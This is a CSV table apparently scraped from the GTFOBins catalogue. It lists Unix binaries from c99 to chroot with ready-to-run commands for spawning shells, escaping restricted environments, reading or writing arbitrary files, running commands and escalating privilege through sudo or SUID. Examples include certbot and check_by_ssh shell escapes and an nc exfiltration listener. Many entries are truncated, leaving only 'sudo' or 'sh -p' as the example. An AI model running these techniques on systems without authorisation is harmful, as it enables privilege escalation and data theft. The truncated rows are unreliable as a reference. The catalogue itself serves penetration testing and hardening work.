Binary,Function Name,Function URL,Description,Example
c99,File read,https://gtfobins.github.io/gtfobins/c99/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
c99 -x c -E ""$LFILE"""
c99,Sudo,https://gtfobins.github.io/gtfobins/c99/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cabal,Shell,https://gtfobins.github.io/gtfobins/cabal/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,cabal exec -- /bin/sh
cabal,SUID,https://gtfobins.github.io/gtfobins/cabal/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cabal,Sudo,https://gtfobins.github.io/gtfobins/cabal/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cancel,File upload,https://gtfobins.github.io/gtfobins/cancel/#file-upload,It can exfiltrate files on the network.,"nc -l -p 12345 > ""file_to_save"""
capsh,Shell,https://gtfobins.github.io/gtfobins/capsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,capsh --
capsh,SUID,https://gtfobins.github.io/gtfobins/capsh/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
capsh,Sudo,https://gtfobins.github.io/gtfobins/capsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cat,File read,https://gtfobins.github.io/gtfobins/cat/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
cat ""$LFILE"""
cat,SUID,https://gtfobins.github.io/gtfobins/cat/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cat,Sudo,https://gtfobins.github.io/gtfobins/cat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cdist,Shell,https://gtfobins.github.io/gtfobins/cdist/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,cdist shell -s /bin/sh
cdist,Sudo,https://gtfobins.github.io/gtfobins/cdist/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
certbot,Shell,https://gtfobins.github.io/gtfobins/certbot/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
certbot,Sudo,https://gtfobins.github.io/gtfobins/certbot/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_by_ssh,Shell,https://gtfobins.github.io/gtfobins/check_by_ssh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx"
check_by_ssh,Sudo,https://gtfobins.github.io/gtfobins/check_by_ssh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_cups,File read,https://gtfobins.github.io/gtfobins/check_cups/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_cups --extra-opts=@$LFILE"
check_cups,Sudo,https://gtfobins.github.io/gtfobins/check_cups/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_log,File write,https://gtfobins.github.io/gtfobins/check_log/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
INPUT=input_file
check_log -F $INPUT -O $LFILE"
check_log,File read,https://gtfobins.github.io/gtfobins/check_log/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
OUTPUT=output_file
check_log -F $LFILE -O $OUTPUT
cat $OUTPUT"
check_log,Sudo,https://gtfobins.github.io/gtfobins/check_log/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_memory,File read,https://gtfobins.github.io/gtfobins/check_memory/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_memory --extra-opts=@$LFILE"
check_memory,Sudo,https://gtfobins.github.io/gtfobins/check_memory/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_raid,File read,https://gtfobins.github.io/gtfobins/check_raid/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_raid --extra-opts=@$LFILE"
check_raid,Sudo,https://gtfobins.github.io/gtfobins/check_raid/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_ssl_cert,Command,https://gtfobins.github.io/gtfobins/check_ssl_cert/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT"
check_ssl_cert,Sudo,https://gtfobins.github.io/gtfobins/check_ssl_cert/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_statusfile,File read,https://gtfobins.github.io/gtfobins/check_statusfile/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_statusfile $LFILE"
check_statusfile,Sudo,https://gtfobins.github.io/gtfobins/check_statusfile/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
chmod,SUID,https://gtfobins.github.io/gtfobins/chmod/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
chmod,Sudo,https://gtfobins.github.io/gtfobins/chmod/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
choom,Shell,https://gtfobins.github.io/gtfobins/choom/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,choom -n 0 /bin/sh
choom,SUID,https://gtfobins.github.io/gtfobins/choom/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
choom,Sudo,https://gtfobins.github.io/gtfobins/choom/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
chown,SUID,https://gtfobins.github.io/gtfobins/chown/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
chown,Sudo,https://gtfobins.github.io/gtfobins/chown/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
chroot,SUID,https://gtfobins.github.io/gtfobins/chroot/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
